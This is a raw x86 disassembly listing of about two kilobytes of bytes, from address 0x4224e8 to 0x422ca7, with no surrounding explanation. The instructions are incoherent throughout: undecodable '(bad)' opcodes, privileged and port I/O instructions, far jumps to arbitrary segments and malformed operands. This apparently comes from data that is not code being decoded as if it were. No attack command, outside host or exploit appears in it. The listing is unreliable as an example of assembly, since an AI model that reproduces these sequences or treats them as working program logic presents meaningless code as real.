  4224e8:	adc    edx,DWORD PTR [edx+esi*8-0x7c]
  4224ec:	icebp  
  4224ed:	add    BYTE PTR [eax],al
  4224ef:	pusha  
  4224f0:	(bad)  
  4224f1:	fs dec esp
  4224f3:	and    eax,0x90000
  4224f8:	test   DWORD PTR [eax],eax
  4224fa:	add    dh,al
  4224fc:	dec    ebp
  4224fd:	and    al,BYTE PTR [esi+0x457a6cac]
  422503:	retf   0xcb52
  422506:	adc    ecx,DWORD PTR [ebp+0x3f]
  422509:	and    dl,BYTE PTR [ebx+eax*1]
  42250c:	or     al,0x91
  42250e:	add    BYTE PTR [eax],al
  422510:	daa    
  422511:	outs   dx,BYTE PTR ds:[esi]
  422512:	jmp    0x8306:0xa0ac3ae9
  422519:	xchg   esp,eax
  42251a:	mov    BYTE PTR [eax+0x0],bh
  42251d:	add    BYTE PTR [ebp+0x7d],bl
  422520:	jecxz  0x4224c1
  422522:	daa    
  422523:	sbb    BYTE PTR [ebx-0x6edf001d],al
  422529:	pop    ds
  42252a:	mov    edx,0xf5ddc9eb
  42252f:	cmp    esi,DWORD PTR [esi+0x16]
  422532:	shl    ch,cl
  422534:	or     al,0x8a
  422536:	add    BYTE PTR [eax],al
  422538:	add    al,0x5a
  42253a:	add    BYTE PTR [eax],al
  42253c:	js     0x42258f
  42253e:	xchg   esi,eax
  42253f:	push   esi
  422540:	mov    bl,0x22
  422542:	aad    0xb9
  422544:	cmp    eax,0x4a3e866e
  422549:	or     edi,ebp
  42254b:	dec    edi
  42254c:	mov    ah,0xdc
  42254e:	and    eax,0x3a7ccf61
  422553:	stos   BYTE PTR es:[edi],al
  422554:	jge    0x4225c9
  422556:	jns    0x4224e4
  422558:	jg     0x42255a
  42255a:	add    BYTE PTR [esp+edx*1],dl
  42255d:	sti    
  42255e:	daa    
  42255f:	repz dec ebx
  422561:	and    dl,dh
  422563:	jo     0x42250a
  422565:	adc    ecx,DWORD PTR [edx-0x5a58a051]
  42256b:	aad    0x65
  42256d:	xchg   ebp,eax
  42256e:	fs cwde 
  422570:	jmp    0x992f22cc
  422575:	mov    dh,0x44
  422577:	sub    al,BYTE PTR [eax]
  422579:	add    BYTE PTR [ebx+ebx*2-0x5bb13435],bh
  422580:	xchg   DWORD PTR [eax-0x3c],edx
  422583:	fiadd  WORD PTR [eax]
  422585:	add    BYTE PTR [edx],dh
  422587:	aaa    
  422588:	repz inc ebp
  42258a:	dec    eax
  42258b:	jmp    0xae582590
  422590:	mov    cl,0x88
  422592:	add    BYTE PTR [eax],al
  422594:	add    BYTE PTR [ecx],bl
  422596:	adc    dh,BYTE PTR [ebp-0x5a]
  422599:	inc    esi
  42259a:	lea    esi,[ebx]
  42259c:	push   eax
  42259d:	and    al,0x62
  42259f:	jno    0x422544
  4225a1:	outs   dx,DWORD PTR ds:[esi]
  4225a2:	and    ebx,DWORD PTR [ebx-0x71996835]
  4225a8:	jbe    0x42261f
  4225aa:	clc    
  4225ab:	fst    DWORD PTR [edi+0x69]
  4225ae:	sbb    BYTE PTR [ecx+ecx*2+0x0],al
  4225b2:	add    dl,dh
  4225b4:	and    al,0x81
  4225b6:	popa   
  4225b7:	iret   
  4225b8:	cmp    DWORD PTR ds:0x3ed491d6,0x52
  4225bf:	xchg   ebx,eax
  4225c0:	mov    DWORD PTR [ebx-0x4c],ecx
  4225c3:	int3   
  4225c4:	add    DWORD PTR [eax],0x0
  4225c7:	sahf   
  4225c8:	pop    edx
  4225c9:	cdq    
  4225ca:	lods   eax,DWORD PTR ds:[esi]
  4225cb:	hlt    
  4225cc:	fsubr  QWORD PTR [esi+eax*8-0x37]
  4225d0:	pop    ebx
  4225d1:	ins    BYTE PTR es:[edi],dx
  4225d2:	xchg   ebp,eax
  4225d3:	mov    fs,WORD PTR [eax]
  4225d5:	cmp    al,0x48
  4225d7:	test   BYTE PTR [eax],al
  4225d9:	add    BYTE PTR [ebp-0x7882cce9],bh
  4225df:	pop    ds
  4225e0:	mov    edx,0x1082315f
  4225e5:	ret    
  4225e6:	inc    esp
  4225e7:	imul   eax,DWORD PTR [eax],0x0
  4225ea:	mov    dl,BYTE PTR [ebx-0x30]
  4225ed:	jecxz  0x4225f1
  4225ef:	mov    cl,0x5
  4225f1:	sub    al,0x42
  4225f3:	inc    esi
  4225f4:	or     bl,0x0
  4225f7:	add    BYTE PTR [eax+0x470000d8],al
  4225fd:	push   0x5e
  4225ff:	jecxz  0x4225e7
  422601:	mov    ds:0x442daed9,al
  422606:	lds    eax,FWORD PTR [eax]
  422608:	add    BYTE PTR [ebx+0x53],ah
  42260b:	jno    0x422669
  42260d:	add    ah,BYTE PTR [esi+eax*8+0xd]
  422611:	and    dl,bl
  422613:	jbe    0x42264f
  422615:	jnp    0x4225f7
  422617:	mov    ecx,0xbcaa4b42
  42261c:	(bad)  
  42261d:	fwait
  42261e:	push   ebp
  42261f:	add    BYTE PTR [eax+0x0],al
  422622:	add    BYTE PTR [ebx],al
  422624:	and    dh,BYTE PTR [eax]
  422626:	fsub   st(1),st
  422628:	xchg   esp,eax
  422629:	push   0x6b
  42262b:	mov    edi,0x5dd038a0
  422630:	xor    eax,0x166cb13
  422635:	arpl   WORD PTR [edi+0x69],ax
  422638:	xchg   esi,eax
  422639:	aas    
  42263a:	push   0xadad472c
  42263f:	add    al,0x15
  422641:	add    BYTE PTR [eax],al
  422643:	jne    0x422614
  422645:	retf   0x7d64
  422648:	pop    ebp
  422649:	pop    edx
  42264a:	adc    DWORD PTR [ebx],ecx
  42264c:	dec    ecx
  42264d:	(bad)  
  42264e:	aam    0xc
  422650:	add    BYTE PTR fs:[eax],al
  422653:	and    ecx,DWORD PTR [ebp+0xec488b]
  422659:	add    BYTE PTR ds:0x790c7dd8,ch
  42265f:	add    BYTE PTR [eax],al
  422661:	daa    
  422662:	stos   BYTE PTR es:[edi],al
  422663:	frstor [esi+0x4f]
  422666:	nop
  422667:	mov    ds:0x357d7623,eax
  42266c:	sar    ah,0x0
  42266f:	add    BYTE PTR [ecx+0x51531ce3],ch
  422675:	xor    DWORD PTR [ebx-0x467699c3],esp
  42267b:	inc    edi
  42267c:	out    0xe8,eax
  42267e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267f:	test   eax,0x3eecfae2
  422684:	push   ss
  422685:	leave  
  422686:	push   esp
  422687:	rcl    BYTE PTR [edx],1
  422689:	xor    eax,0x4f62f813
  42268e:	repz xchg ecx,eax
  422690:	push   ss
  422691:	jecxz  0x422661
  422693:	mov    ebx,DWORD PTR [ebx+0x20c5548b]
  422699:	dec    esp
  42269a:	inc    esp
  42269b:	add    BYTE PTR [eax],al
  42269d:	push   edx
  42269e:	data16 and BYTE PTR [edx],dl
  4226a1:	or     dh,dl
  4226a3:	or     bh,BYTE PTR [edi]
  4226a5:	jo     0x422659
  4226a7:	in     eax,dx
  4226a8:	rcl    BYTE PTR [ebx+ebp*4-0x48],cl
  4226ac:	dec    ebx
  4226ad:	ins    BYTE PTR es:[edi],dx
  4226ae:	or     edi,edi
  4226b0:	add    DWORD PTR [ebp-0xe],0x67
  4226b4:	sti    
  4226b5:	sbb    DWORD PTR [ebx-0x19],edx
  4226b8:	or     al,0x7c
  4226ba:	add    BYTE PTR [eax],al
  4226bc:	xchg   BYTE PTR [edi-0x26],ah
  4226bf:	add    edx,DWORD PTR [ebx]
  4226c1:	mov    dh,0x4
  4226c3:	adc    al,BYTE PTR [eax]
  4226c5:	add    BYTE PTR [edi],dh
  4226c7:	imul   esi,DWORD PTR [eax+0x74421c25],0x6064fe16
  4226d1:	add    esi,DWORD PTR [esi]
  4226d3:	mov    ebp,0xf8c0b6ba
  4226d8:	add    BYTE PTR [eax],al
  4226da:	gs inc ebx
  4226dc:	or     bh,BYTE PTR [ecx-0x6b]
  4226df:	mov    edx,0x4e141b73
  4226e4:	call   0xd648:0x2db3d0a2
  4226eb:	add    BYTE PTR [eax],al
  4226ed:	pop    ebp
  4226ee:	adc    DWORD PTR [ebx-0x14565df5],edx
  4226f4:	dec    edx
  4226f5:	loop   0x422747
  4226f7:	and    dl,BYTE PTR [eax+0x18c882]
  4226fd:	add    BYTE PTR [ebx-0x4d46993a],bh
  422703:	xor    bh,BYTE PTR [ecx-0x2869328b]
  422709:	daa    
  42270a:	hlt    
  42270b:	or     al,0xd5
  42270d:	add    BYTE PTR [eax],al
  42270f:	xchg   esi,eax
  422710:	push   esi
  422711:	and    bl,BYTE PTR [ebp-0x48]
  422714:	add    eax,0xccced9f0
  422719:	stos   BYTE PTR es:[edi],al
  42271a:	add    BYTE PTR [eax],al
  42271c:	xchg   cl,ch
  42271e:	cmp    eax,0xa42ad599
  422723:	in     al,dx
  422724:	sbb    bh,ch
  422726:	jae    0x42274c
  422728:	jmp    0x5c0d2d68
  42272d:	mov    esi,0x1bf6bb51
  422732:	inc    esp
  422733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422734:	add    BYTE PTR [eax],al
  422736:	mov    cl,0x53
  422738:	imul   ebx,DWORD PTR [edx-0x35],0x72
  42273c:	cdq    
  42273d:	hlt    
  42273e:	inc    esp
  42273f:	call   0xd8e1:0xd0c70000
  422746:	lahf   
  422747:	push   0x10
  422749:	mov    ds:0x80e9c3b7,al
  42274e:	imul   eax,DWORD PTR [eax],0x0
  422751:	pop    ebp
  422752:	jl     0x4227d2
  422754:	push   es
  422755:	add    al,0x91
  422757:	add    BYTE PTR [eax],al
  422759:	stos   DWORD PTR es:[edi],eax
  42275a:	xchg   ebx,eax
  42275b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42275c:	sbb    edi,DWORD PTR [ebx]
  42275e:	loop   0x422708
  422760:	aam    0x6e
  422762:	into   
  422763:	mov    ah,0xa6
  422765:	jnp    0x4227e2
  422767:	mov    ecx,0x38f4d309
  42276c:	fnsave [ebx-0x7f]
  42276f:	sub    edi,esp
  422771:	jmp    0xbac0c20a
  422776:	sub    ebp,0x77
  422779:	and    edi,DWORD PTR [ebx-0x67b30858]
  42277f:	add    BYTE PTR [eax],al
  422781:	jns    0x422799
  422783:	pusha  
  422784:	bound  esp,QWORD PTR [edx+0x1b]
  422787:	push   es
  422788:	cmp    BYTE PTR [edx],dl
  42278a:	leave  
  42278b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42278c:	out    dx,eax
  42278d:	pop    edi
  42278e:	push   edx
  42278f:	mov    ebp,0xc4877381
  422794:	je     0x422796
  422796:	add    BYTE PTR [eax+0x26],bl
  422799:	add    DWORD PTR [esi-0x65],0xf841c525
  4227a0:	pop    dx
  4227a2:	mov    edi,ecx
  4227a4:	and    DWORD PTR [ebp+ebp*2+0xe],ebx
  4227a8:	inc    edi
  4227a9:	(bad)  
  4227aa:	repz mov bl,0x93
  4227ad:	int3   
  4227ae:	mov    al,ds:0x5fb0000
  4227b3:	dec    ebx
  4227b4:	out    dx,al
  4227b5:	xchg   BYTE PTR ds:0x96462777,bl
  4227bb:	popa   
  4227bc:	pop    ecx
  4227bd:	aas    
  4227be:	xchg   DWORD PTR [eax],esp
  4227c0:	fadd   DWORD PTR ds:0x99253945
  4227c6:	add    DWORD PTR [edx],eax
  4227c8:	push   0x3311b69d
  4227cd:	jns    0x422776
  4227cf:	sbb    DWORD PTR [ebp-0x72],esi
  4227d2:	lea    edx,[esi-0x1]
  4227d5:	sub    bl,BYTE PTR [esi-0x32]
  4227d8:	add    ebp,DWORD PTR [ebp-0x45]
  4227db:	cs push ebx
  4227dd:	stos   DWORD PTR es:[edi],eax
  4227de:	cli    
  4227df:	pop    edx
  4227e0:	mov    dh,BYTE PTR es:[eax]
  4227e3:	mov    esp,DWORD PTR [edx+0x79d281b3]
  4227e9:	cwde   
  4227ea:	jg     0x42284d
  4227ec:	sub    eax,0xbd1ff7d4
  4227f1:	and    bl,bl
  4227f3:	xchg   ebp,eax
  4227f4:	sub    dh,BYTE PTR [edi]
  4227f6:	pop    edx
  4227f7:	lahf   
  4227f8:	and    ah,ah
  4227fa:	xchg   ebx,eax
  4227fb:	xor    eax,0xa89816cf
  422800:	push   ss
  422801:	cmp    bl,ch
  422803:	xor    edx,DWORD PTR [esi]
  422805:	(bad)  
  422806:	aas    
  422807:	xor    BYTE PTR [ecx],dh
  422809:	dec    edi
  42280a:	call   0xdb1c:0x8aafdcbd
  422811:	jecxz  0x4227d1
  422813:	jle    0x422846
  422815:	add    DWORD PTR [edi+eax*1],eax
  422818:	add    BYTE PTR [eax],al
  42281a:	sbb    ch,BYTE PTR [esi*4-0x76a164b7]
  422821:	xchg   ebp,eax
  422822:	lock das 
  422824:	push   edx
  422825:	fwait
  422826:	outs   dx,BYTE PTR ds:[esi]
  422827:	or     BYTE PTR [esi+0x0],dl
  42282a:	add    BYTE PTR [edx-0x58],cl
  42282d:	pop    edi
  42282e:	pop    ss
  42282f:	mov    edi,0x37e36191
  422834:	dec    ecx
  422835:	adc    DWORD PTR [ebp+0x42],ebx
  422838:	das    
  422839:	scas   eax,DWORD PTR es:[edi]
  42283a:	sub    eax,0x81afdefa
  42283f:	je     0x42284d
  422841:	dec    ebx
  422842:	add    BYTE PTR [eax],al
  422844:	fwait
  422845:	push   ebx
  422846:	jle    0x4227e8
  422848:	adc    ebx,ecx
  42284a:	push   es
  42284b:	pop    esi
  42284c:	fst    DWORD PTR [esi+0x14db9125]
  422852:	lock inc ecx
  422854:	pushf  
  422855:	aaa    
  422856:	shl    ch,0x0
  422859:	add    al,dl
  42285b:	xchg   ebx,eax
  42285c:	loope  0x4227fd
  42285e:	mov    BYTE PTR [ecx-0x21240000],al
  422864:	or     bl,BYTE PTR [esi-0x3bb022c]
  42286a:	add    BYTE PTR [eax],al
  42286c:	ror    DWORD PTR [eax],1
  42286e:	rol    DWORD PTR [eax],1
  422870:	add    BYTE PTR [esi-0x4e],cl
  422873:	jno    0x42284c
  422875:	cmp    BYTE PTR [esi],dh
  422877:	add    al,0x6a
  422879:	add    BYTE PTR [eax],al
  42287b:	xchg   edx,eax
  42287c:	or     ah,dh
  42287e:	je     0x42282d
  422880:	xor    BYTE PTR [ecx-0x19c1a505],ah
  422886:	inc    BYTE PTR [eax-0x20fffffa]
  42288c:	mov    eax,ds:0x699020bc
  422891:	fs or  ebp,edx
  422894:	ror    DWORD PTR [edi],1
  422896:	fimul  WORD PTR [ebp+0x30]
  422899:	or     dl,BYTE PTR [edi+0x7d015e38]
  42289f:	cmp    esi,0x72
  4228a2:	leave  
  4228a3:	sti    
  4228a4:	mov    ds:0x7658dd1,eax
  4228a9:	jbe    0x4228ba
  4228ab:	fld    TBYTE PTR [esi+0x2d]
  4228ae:	icebp  
  4228af:	sar    dl,cl
  4228b1:	sub    DWORD PTR [eax+0x1cecec72],0xffffffdc
  4228b8:	xlat   BYTE PTR ds:[ebx]
  4228b9:	dec    ebx
  4228bb:	test   eax,0x89d968dc
  4228c0:	jg     0x4228c9
  4228c2:	add    BYTE PTR [ecx],al
  4228c4:	add    BYTE PTR [eax],al
  4228c6:	inc    esi
  4228c7:	mov    DWORD PTR [edi],edx
  4228c9:	in     al,0x7a
  4228cb:	cmp    eax,ebp
  4228cd:	pop    es
  4228ce:	sbb    esi,DWORD PTR [eax+0xe380e1]
  4228d4:	add    BYTE PTR [ecx*4-0x29210000],cl
  4228db:	call   eax
  4228dd:	fsub   DWORD PTR [ecx-0x5f]
  4228e0:	cli    
  4228e1:	pop    edi
  4228e2:	mov    DWORD PTR [eax],0x580000f0
  4228e8:	pop    eax
  4228e9:	add    eax,DWORD PTR [ebp+0x52]
  4228ec:	popf   
  4228ed:	adc    edx,ecx
  4228ef:	mov    dl,0x44
  4228f1:	imul   eax,DWORD PTR [eax],0x40f83400
  4228f7:	loop   0x4228f9
  4228f9:	add    BYTE PTR ds:0x4346259b,dl
  4228ff:	scas   al,BYTE PTR es:[edi]
  422900:	xchg   edx,eax
  422901:	xor    dh,ch
  422903:	cmp    al,BYTE PTR [ebx]
  422905:	mov    al,0xca
  422907:	mov    dl,0x9c
  422909:	mov    edx,edi
  42290b:	mov    ds:0xfb179f9f,eax
  422910:	cmp    BYTE PTR [esi+0x484a0000],0xe2
  422917:	add    BYTE PTR [eax],al
  422919:	imul   edi,DWORD PTR [ecx+0x5c16b760],0x7c
  422920:	or     eax,0x288022
  422925:	add    BYTE PTR [ecx+0x4171e54],cl
  42292b:	push   esi
  42292c:	add    BYTE PTR [eax],al
  42292e:	out    dx,eax
  42292f:	out    0xcf,al
  422931:	(bad)  
  422932:	ret    0x3b5f
  422935:	cmp    bl,BYTE PTR [ebx-0x6b]
  422938:	pop    esp
  422939:	call   0xaaa8579c
  42293e:	pop    ebp
  42293f:	jne    0x4229a0
  422941:	pusha  
  422942:	hlt    
  422943:	adc    eax,0xda9047b7
  422948:	sub    ecx,DWORD PTR [eax+0x250000c4]
  42294e:	adc    eax,0xa8ed7d4a
  422953:	inc    eax
  422954:	or     DWORD PTR [eax],eax
  422956:	add    bh,cl
  422958:	push   eax
  422959:	(bad)  [edi-0x64]
  42295c:	jbe    0x422972
  42295e:	inc    ebp
  42295f:	pop    ecx
  422960:	(bad)  
  422961:	push   cs
  422962:	inc    esp
  422963:	fadd   DWORD PTR [eax]
  422965:	add    BYTE PTR [ebx-0x1],ah
  422968:	stc    
  422969:	add    bl,BYTE PTR [esi+0x53]
  42296c:	xchg   edx,eax
  42296d:	mov    dl,0x4b
  42296f:	mov    ecx,0x3f5b47a9
  422974:	mov    esi,0x6e24a6a1
  42297a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42297b:	adc    DWORD PTR [edi],esi
  42297d:	mov    ecx,0x39c2354a
  422982:	mov    ch,0xd0
  422984:	or     al,al
  422986:	add    BYTE PTR [eax],al
  422988:	xor    DWORD PTR [ecx+0x30bcdfd3],0xffffff82
  42298f:	sbb    esp,eax
  422991:	xchg   ebp,eax
  422992:	add    BYTE PTR [eax],al
  422994:	jo     0x422975
  422996:	dec    ecx
  422997:	pop    ebx
  422998:	ror    DWORD PTR [eax],cl
  42299a:	xchg   esi,eax
  42299b:	add    BYTE PTR [eax],al
  42299d:	jnp    0x422977
  42299f:	stos   DWORD PTR es:[edi],eax
  4229a0:	inc    ebx
  4229a1:	mov    cl,0xa4
  4229a3:	mov    ecx,0x9e80ee
  4229a8:	add    bl,dl
  4229aa:	cmc    
  4229ab:	push   ebx
  4229ac:	sar    BYTE PTR [esi+0x3b300000],0x91
  4229b3:	ins    DWORD PTR es:[edi],dx
  4229b4:	fstsw  WORD PTR [ebp+0x664362c3]
  4229bb:	cdq    
  4229bc:	and    DWORD PTR [edx+0x600450],0x0
  4229c3:	stos   DWORD PTR es:[edi],eax
  4229c4:	xchg   edx,eax
  4229c5:	mov    eax,0xe800007b
  4229cb:	dec    edx
  4229cc:	pop    esp
  4229cd:	jge    0x4229b7
  4229cf:	push   cs
  4229d0:	iret   
  4229d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229d2:	je     0x4229e1
  4229d4:	popf   
  4229d5:	addr16 fwait
  4229d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229d8:	mov    edx,0x842e61fc
  4229dd:	pop    ecx
  4229de:	add    BYTE PTR [eax],al
  4229e0:	sbb    esp,0xffffff88
  4229e3:	add    BYTE PTR gs:[eax],al
  4229e6:	dec    ebp
  4229e7:	ss mov edx,0xdf84a3
  4229ed:	add    BYTE PTR [edi+edi*4+0x64c0],bl
  4229f4:	mov    edx,0x1f924e65
  4229f9:	das    
  4229fa:	push   ebp
  4229fb:	push   ss
  4229fc:	xchg   BYTE PTR [ebx-0x41ed0012],bh
  422a02:	hlt    
  422a03:	scas   al,BYTE PTR es:[edi]
  422a04:	sti    
  422a05:	push   esp
  422a06:	and    al,0x8a
  422a08:	mov    eax,ds:0x116f0a31
  422a0d:	push   0x2b71ef85
  422a12:	jge    0x4229a7
  422a14:	adc    eax,0xc3524182
  422a19:	out    dx,al
  422a1a:	repz (bad) 
  422a1c:	ins    DWORD PTR es:[edi],dx
  422a1d:	mov    ecx,0xd56ef4c9
  422a22:	jne    0x4229a9
  422a24:	mov    ecx,0xa8651a0f
  422a29:	mov    eax,ds:0xd8cafae
  422a2e:	add    BYTE PTR [eax],al
  422a30:	iret   
  422a31:	mov    ds:0x18f3fae8,al
  422a36:	int3   
  422a37:	fiadd  DWORD PTR [eax]
  422a39:	add    ch,ah
  422a3b:	push   0xb05d0610
  422a40:	lock mov di,0x16a3
  422a45:	dec    edx
  422a46:	aad    0xf0
  422a48:	addr16 test bl,bl
  422a4b:	add    BYTE PTR [eax],al
  422a4d:	xor    eax,0x7b36e2e4
  422a52:	mov    esi,0x66bef54e
  422a57:	cli    
  422a58:	int3   
  422a59:	clc    
  422a5a:	add    BYTE PTR [eax],al
  422a5c:	or     ebx,DWORD PTR [eax+0x8e08]
  422a62:	or     ah,BYTE PTR [ebx-0x53]
  422a65:	pop    eax
  422a66:	xchg   edx,eax
  422a67:	inc    ebx
  422a68:	stos   BYTE PTR es:[edi],al
  422a69:	inc    eax
  422a6a:	xor    eax,DWORD PTR [eax]
  422a6c:	add    bl,bl
  422a6e:	icebp  
  422a6f:	push   es
  422a70:	or     ebp,ebp
  422a72:	push   es
  422a73:	mov    ebp,0x7ee12018
  422a78:	inc    ebp
  422a79:	(bad)  
  422a7a:	iret   
  422a7b:	fiadd  WORD PTR [edx+0xff04fb]
  422a81:	add    cl,bl
  422a83:	(bad)  
  422a84:	mov    esp,0x7461c3a
  422a89:	push   esp
  422a8a:	mov    al,dh
  422a8c:	pop    ecx
  422a8d:	sub    al,0x8e
  422a8f:	sbb    ebx,ecx
  422a91:	clc    
  422a92:	stc    
  422a93:	inc    ebx
  422a94:	addr16 inc ebx
  422a96:	loop   0x422a3f
  422a98:	repz mov esp,0xb771fb52
  422a9e:	vorps  ymm6,ymm5,YMMWORD PTR [eax]
  422aa2:	mov    ebp,ecx
  422aa4:	push   eax
  422aa5:	aad    0x5
  422aa7:	adc    BYTE PTR [eax+0x0],0x0
  422aab:	mov    WORD PTR [edi+0x0],gs
  422aae:	add    BYTE PTR [eax],al
  422ab0:	mov    WORD PTR [eax],es
  422ab2:	add    ch,cl
  422ab4:	xchg   BYTE PTR ss:[ebp-0x69cf0c7b],cl
  422abb:	in     al,dx
  422abc:	scas   al,BYTE PTR es:[edi]
  422abd:	jnp    0x422afc
  422abf:	mov    ?,WORD PTR [edi]
  422ac1:	mov    ch,0xa3
  422ac3:	jecxz  0x422a66
  422ac5:	int    0x94
  422ac7:	in     al,0x76
  422ac9:	adc    DWORD PTR [ecx+0xc],eax
  422acc:	loope  0x422ace
  422ace:	add    BYTE PTR [ecx-0xb],ah
  422ad1:	add    BYTE PTR [edi-0x12e90000],dh
  422ad7:	jge    0x422b09
  422ad9:	test   eax,0x3a2dca2a
  422ade:	add    bl,0xbb
  422ae1:	inc    esi
  422ae2:	push   ds
  422ae3:	add    dh,BYTE PTR [ecx+0xc]
  422ae6:	sub    eax,0x585e0000
  422aeb:	int3   
  422aec:	ins    BYTE PTR es:[edi],dx
  422aed:	add    BYTE PTR [eax],al
  422aef:	mov    ecx,edx
  422af1:	mov    al,BYTE PTR [edi+0x46]
  422af4:	mov    eax,0x6220347a
  422af9:	sub    al,0x15
  422afb:	xchg   DWORD PTR [ecx+0x4d84],ecx
  422b01:	dec    ebp
  422b02:	adc    bl,BYTE PTR [ecx-0x63]
  422b05:	test   DWORD PTR [ebx+0x50],edx
  422b08:	sub    dh,BYTE PTR [esi+0x55]
  422b0b:	add    DWORD PTR [ecx+0x567e2c9e],0xffffffe2
  422b12:	popa   
  422b13:	xor    bh,0xa4
  422b16:	sub    BYTE PTR [ebp-0x57ad6942],cl
  422b1c:	add    BYTE PTR [eax+eax*1+0x6de2bd00],ah
  422b23:	int    0x39
  422b25:	add    al,0x97
  422b27:	add    BYTE PTR [eax],al
  422b29:	or     DWORD PTR ds:0xd7f00a69,edi
  422b2f:	jmp    0x422ba0
  422b31:	xchg   edi,eax
  422b32:	pop    ebx
  422b33:	cmp    BYTE PTR [esi+0x5d3828cd],ah
  422b39:	sub    edi,ebp
  422b3b:	sbb    eax,0x59042775
  422b40:	add    BYTE PTR [eax],al
  422b42:	sub    ecx,DWORD PTR [esi+0x71]
  422b45:	push   cs
  422b46:	sti    
  422b47:	xchg   BYTE PTR [edx+0xd488],dh
  422b4d:	lahf   
  422b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b4f:	add    DWORD PTR [ebp+0x729e5b6f],esi
  422b55:	sub    al,0x1c
  422b57:	pop    ds
  422b58:	ret    
  422b59:	out    0xf9,eax
  422b5b:	fist   DWORD PTR [edx+0xa]
  422b5e:	dec    ecx
  422b5f:	outs   dx,BYTE PTR ds:[esi]
  422b60:	xor    eax,0x341c9d5e
  422b65:	call   0xda753a85
  422b6a:	inc    ebx
  422b6b:	popa   
  422b6c:	sub    BYTE PTR [edx-0x43d322c9],cl
  422b72:	pop    esi
  422b73:	sbb    al,0x24
  422b75:	inc    edi
  422b76:	icebp  
  422b77:	stos   DWORD PTR es:[edi],eax
  422b78:	add    dl,BYTE PTR [edi]
  422b7a:	or     DWORD PTR [edx],edi
  422b7c:	and    DWORD PTR [ebx],esp
  422b7e:	and    ebp,0x5bfa192d
  422b84:	sbb    esi,esp
  422b86:	(bad)
  422b8a:	pop    ecx
  422b8b:	dec    edi
  422b8c:	mov    bl,0x2b
  422b8e:	push   ebx
  422b8f:	mov    esi,0xe1a929a9
  422b94:	mov    ds:0x4b114762,al
  422b99:	push   edx
  422b9a:	enter  0xf4,0x0
  422b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b9f:	sahf   
  422ba0:	jp     0x422b6f
  422ba2:	ret    
  422ba3:	ret    0x15b1
  422ba6:	and    bh,BYTE PTR [edi+0x1ffc3a37]
  422bac:	xchg   DWORD PTR [esi+0x54],ebx
  422baf:	pop    esp
  422bb0:	fiadd  DWORD PTR [edi]
  422bb2:	push   esp
  422bb3:	xchg   edx,eax
  422bb4:	mov    dl,BYTE PTR ds:0xebf51085
  422bba:	(bad)  
  422bbb:	pop    ebx
  422bbc:	cdq    
  422bbd:	aaa    
  422bbe:	repz jbe 0x422b75
  422bc1:	int3   
  422bc2:	add    BYTE PTR [eax],0x0
  422bc5:	add    DWORD PTR [ebp+0xb800],ebx
  422bcb:	inc    esi
  422bcc:	js     0x422c13
  422bce:	mov    eax,0x958c
  422bd3:	cmp    DWORD PTR [esi+ebp*8+0x2c],ebp
  422bd7:	add    BYTE PTR [eax+eax*1+0x0],ch
  422bdb:	add    al,0xa7
  422bdd:	add    BYTE PTR [eax],al
  422bdf:	adc    DWORD PTR [esi+ebx*1],ebp
  422be2:	fld    st(6)
  422be4:	cs (bad) 
  422be6:	mov    edx,ecx
  422be8:	mov    bl,0x53
  422bea:	sbb    ch,bl
  422bec:	out    dx,eax
  422bed:	out    dx,al
  422bee:	aas    
  422bef:	mov    eax,0xab5fb094
  422bf4:	dec    ebp
  422bf5:	test   eax,0xebc04353
  422bfa:	add    BYTE PTR [eax],al
  422bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bfd:	mov    esi,0xf7ec1a0f
  422c02:	mov    esp,0x68827d53
  422c07:	repnz retf 
  422c09:	data16 int 0x45
  422c0c:	loopne 0x422c62
  422c0e:	add    esp,edx
  422c10:	jge    0x422bd9
  422c12:	mov    eax,ds:0x730e4b4b
  422c17:	pop    ds
  422c18:	mov    WORD PTR [ecx+0x0],cs
  422c1b:	add    BYTE PTR ds:0xdd174b53,dh
  422c21:	jge    0x422c97
  422c23:	(bad)  
  422c24:	nop
  422c25:	push   ss
  422c26:	enter  0x6e,0x0
  422c2a:	mov    dl,0x0
  422c2c:	out    0x0,al
  422c2e:	add    BYTE PTR [esi-0x38],dl
  422c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    ?,WORD PTR [edi-0x6a3b03a2]
  422c3a:	add    BYTE PTR [eax],al
  422c3c:	int3   
  422c3d:	stc    
  422c3e:	add    BYTE PTR [eax],al
  422c40:	mov    eax,ds:0x9e912de5
  422c45:	ds jecxz 0x422cb2
  422c48:	sbb    edi,DWORD PTR [edi+esi*2-0x71a89fd]
  422c4f:	push   ss
  422c50:	mov    dl,0xff
  422c52:	shl    BYTE PTR [ebx+0x59],1
  422c55:	xchg   ebx,eax
  422c56:	in     al,dx
  422c57:	psubsw mm4,mm5
  422c5a:	lods   al,BYTE PTR cs:[esi]
  422c5c:	add    DWORD PTR [edi],edi
  422c5e:	aam    0x13
  422c60:	pop    ebx
  422c61:	xor    al,0x4f
  422c63:	out    dx,al
  422c64:	jmp    0x422c24
  422c66:	sub    al,0x12
  422c68:	push   0x3
  422c6a:	xor    eax,0x9ac4dde5
  422c6f:	add    BYTE PTR [eax],al
  422c71:	and    DWORD PTR [edx],0xffffffa6
  422c74:	in     eax,dx
  422c75:	pop    ebp
  422c76:	lods   eax,DWORD PTR ds:[esi]
  422c77:	(bad)  
  422c78:	into   
  422c79:	or     eax,0x8f4c
  422c7e:	adc    ah,BYTE PTR [ebx-0x7c9621d4]
  422c84:	(bad)  
  422c85:	xor    eax,0x41ea5f7b
  422c8a:	xchg   DWORD PTR [ecx-0x57],eax
  422c8d:	sub    al,0x62
  422c8f:	dec    esi
  422c90:	and    ch,BYTE PTR [edi]
  422c92:	push   0x7a7c74ae
  422c97:	dec    ebp
  422c98:	ins    DWORD PTR es:[edi],dx
  422c99:	cmp    dl,BYTE PTR [edi+ecx*2-0x37]
  422c9d:	imul   ebp,DWORD PTR [eax+0x52230dea],0x1aceab95
  422ca7:	cli    
